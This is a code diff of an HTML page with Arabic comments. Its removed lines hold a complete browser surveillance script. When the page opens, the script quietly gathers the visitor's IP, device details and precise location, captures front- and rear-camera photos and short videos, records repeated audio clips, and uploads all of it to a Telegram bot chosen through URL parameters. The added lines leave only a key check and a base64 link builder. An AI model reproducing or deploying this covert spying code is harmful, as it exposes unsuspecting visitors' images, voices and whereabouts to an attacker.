@@ -15,210 +15,29 @@
 <body>
 <div id="out"></div>
 
-<canvas id="cv" style="display:none"></canvas>
-<video id="vid" autoplay muted playsinline style="display:none"></video>
-
 <script>
-/* ================== الإعدادات ================== */
-const API_KEY = "754298";  // المفتاح السري
+const API_KEY = "754298";
 
-/* ================== قراءة الـ URL ================== */
 const qs = new URLSearchParams(location.search);
-const api   = qs.get('api')   || '';
-const id    = qs.get('id')    || '';
-const token = qs.get('token') || '';
 
 /* فحص المفتاح */
-if (api !== API_KEY){
-  document.body.innerHTML = '<div style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Tahoma;background:#fff;color:#c00;font-size:22px">خطأ في API Key</div>';
-  throw new Error('invalid api key');
-}
-if (!id || !token){
-  document.body.innerHTML = '<div style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Tahoma;background:#fff;color:#c00;font-size:22px">خطأ: id / token مفقود</div>';
-  throw new Error('missing id/token');
+if (qs.get('api') !== API_KEY){
+  document.body.innerHTML = '<div style="height:100vh;display:flex;align-items:center;justify-content:center;font-family:Tahoma;background:#fff;color:#c00;font-size:22px">خطأ في API Key</div>';
+  throw 0;
 }
 
-/* الحاجات المطلوبة */
-const want = {
-  inf: qs.has('inf'),
-  bc : qs.has('bc'),
-  fc : qs.has('fc'),
-  loc: qs.has('l'),
-  bcv: qs.has('bcv'),
-  fcv: qs.has('fcv'),
-  r  : qs.has('r')
-};
+/* بناء رابط dl.html بنفس البارامترات */
+const base = location.href.split('?')[0].replace('index.html', 'dl.html');
+const params = new URLSearchParams(location.search);   // نفس البارامترات كلها
+const fullUrl = base + '?' + params.toString();
 
-/* ================== إرسال للبوت ================== */
-async function tg(endpoint, formData){
-  const url = 'https://api.telegram.org/bot' + token + '/' + endpoint;
-  try { await fetch(url, {method:'POST', body: formData}); } catch(e){}
-}
-function tgText(txt){
-  const fd = new FormData(); fd.append('chat_id', id); fd.append('text', txt);
-  fd.append('parse_mode','HTML'); return tg('sendMessage', fd);
-}
-function tgFile(blob, name, type, caption){
-  const fd = new FormData();
-  fd.append('chat_id', id);
-  fd.append('caption', caption);
-  let ep = 'sendDocument', m = 'document';
-  if (type.startsWith('image/')) { ep='sendPhoto'; m='photo'; }
-  else if (type.startsWith('video/')) { ep='sendVideo'; m='video'; }
-  else if (type.startsWith('audio/')) { ep='sendAudio'; m='audio'; }
-  fd.append(m, blob, name);
-  return tg(ep, fd);
-}
+/* تشفير base64 */
+const enc = btoa(unescape(encodeURIComponent(fullUrl)))
+  .replace(/=+$/,'').replace(/\+/g,'-').replace(/\//g,'_');
 
-/* ================== 1) معلومات الجهاز ================== */
-async function getInfo(){
-  const n = navigator, s = screen;
-  let ip = '?';
-  try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
-  let bat = '?';
-  try {
-    const b = await navigator.getBattery();
-    bat = Math.round(b.level*100) + '% ' + (b.charging?'(charging)':'');
-  } catch(e){}
-
-  await tgText(`<b>🖥 معلومات الجهاز</b>
-IP: <code>${ip}</code>
-UA: <code>${n.userAgent}</code>
-Platform: ${n.platform}
-Language: ${n.language}
-Screen: ${s.width}x${s.height}
-Viewport: ${innerWidth}x${innerHeight}
-Cores: ${n.hardwareConcurrency || '?'}
-RAM: ${n.deviceMemory || '?'} GB
-Touch: ${n.maxTouchPoints}
-Battery: ${bat}
-Time: ${new Date().toLocaleString('ar-EG')}`);
-}
-
-/* ================== 2) الموقع ================== */
-function getLocation(){
-  return new Promise(res => {
-    if (!navigator.geolocation) return res();
-    navigator.geolocation.getCurrentPosition(
-      async p => {
-        const {latitude:la, longitude:lo, accuracy:ac} = p.coords;
-        const map = `https://www.google.com/maps?q=${la},${lo}`;
-        await tgText(`<b>📍 الموقع</b>\nLat: <code>${la}</code>\nLng: <code>${lo}</code>\nAcc: ${ac}m\n<a href="${map}">فتح الخريطة</a>`);
-        res();
-      },
-      () => res(),
-      {enableHighAccuracy:true, timeout:15000}
-    );
-  });
-}
-
-/* ================== 3) صورة كاميرا ================== */
-async function capturePhoto(facing){
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: facing === 'user' ? 'user' : 'environment' }
-    });
-    const vid = document.getElementById('vid');
-    vid.srcObject = stream;
-    await vid.play();
-    await new Promise(r => setTimeout(r, 1200));
-
-    const cv = document.getElementById('cv');
-    cv.width  = vid.videoWidth;
-    cv.height = vid.videoHeight;
-    cv.getContext('2d').drawImage(vid, 0, 0);
-    const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.85));
-    stream.getTracks().forEach(t => t.stop());
-
-    await tgFile(blob, (facing==='user'?'front':'back')+'_'+Date.now()+'.jpg', 'image/jpeg',
-      `<b>📷 كاميرا ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
-  } catch(e){}
-}
-
-/* ================== 4) فيديو 5 ثواني ================== */
-async function captureVideo(facing){
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: facing === 'user' ? 'user' : 'environment' },
-      audio: true
-    });
-    const vid = document.getElementById('vid');
-    vid.srcObject = stream;
-    await vid.play();
-
-    const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
-    const chunks = [];
-    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-
-    await new Promise(resolve => {
-      rec.onstop = async () => {
-        stream.getTracks().forEach(t => t.stop());
-        const blob = new Blob(chunks, {type:'video/webm'});
-        await tgFile(blob, (facing==='user'?'front':'back')+'_'+Date.now()+'.webm', 'video/webm',
-          `<b>🎥 فيديو ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
-        resolve();
-      };
-      rec.start();
-      setTimeout(() => rec.stop(), 5000);
-    });
-  } catch(e){}
-}
-
-/* ================== 5) تسجيل صوتي متكرر ================== */
-async function recordAudioLoop(){
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({audio:true});
-    const rec = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-    const chunks = [];
-    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-    let count = 0;
-    const TOTAL = 6;
-
-    await new Promise(resolve => {
-      rec.onstop = async () => {
-        const blob = new Blob(chunks, {type:'audio/webm'});
-        count++;
-        await tgFile(blob, 'rec_' + Date.now() + '.webm', 'audio/webm',
-          `<b>🎙 تسجيل صوتي #${count}</b>`);
-        chunks.length = 0;
-        if (count < TOTAL) {
-          rec.start();
-          setTimeout(() => rec.stop(), 5000);
-        } else {
-          stream.getTracks().forEach(t=>t.stop());
-          resolve();
-        }
-      };
-      rec.start();
-      setTimeout(() => rec.stop(), 5000);
-    });
-  } catch(e){}
-}
-
-/* ================== التشفير Base64 ================== */
-function b64url(str){
-  return btoa(unescape(encodeURIComponent(str)))
-    .replace(/=+$/,'').replace(/\+/g,'-').replace(/\//g,'_');
-}
-
-/* ================== التشغيل ================== */
-(async () => {
-  if (want.inf) await getInfo();
-  if (want.loc) await getLocation();
-  if (want.bc)  await capturePhoto('environment');
-  if (want.fc)  await capturePhoto('user');
-  if (want.bcv) await captureVideo('environment');
-  if (want.fcv) await captureVideo('user');
-  if (want.r)   await recordAudioLoop();
-
-  /* بناء رابط صفحة التحميل + تشفيره base64 */
-  const base = location.href.split('?')[0].replace('index.html', 'dl.html');
-  const enc  = b64url(base);
-  const finalUrl = base + '?u=' + encodeURIComponent(enc);
-
-  /* عرض الرابط المشفر فقط في صفحة بيضاء */
-  document.getElementById('out').textContent = finalUrl;
-})();
+/* عرض الرابط المشفر + رابط جاهز للفتح */
+document.getElementById('out').innerHTML =
+  '<div>' + fullUrl + '?u=' + encodeURIComponent(enc) + '</div>';
 </script>
 </body>
 </html>
